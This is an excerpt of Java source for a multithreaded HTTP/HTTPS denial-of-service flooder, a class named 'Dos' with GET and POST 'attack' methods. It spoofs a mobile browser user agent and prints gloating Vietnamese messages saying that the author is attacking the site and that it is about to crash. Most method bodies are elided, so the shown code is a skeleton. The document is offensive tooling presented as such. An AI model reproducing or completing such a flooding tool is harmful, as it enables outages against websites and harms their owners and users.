...
public class Dos implements Runnable {
    ...
    private final String USER_AGENT =   "Mozilla/5.0 (Linux; Android 11; SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36";
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Lộc Đang Tấn Công Web Này:))): " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Lộc Đang Tấn Công Web Này:)))" + responseCode + "Số Lượt Truy Cập: " + this.seq);
    }
    ...
    private void sslPostAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Lộc Yêu Web Này Quá:))):" + responseCode + "Số Lượt Truy Cập: " + this.seq);
    }
    ...
    private void sslGetAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Web Sắp Sập Rồi Kìa Hahahaha: " + responseCode + "Số Lượt Truy Cập: " + this.seq);
    }
}
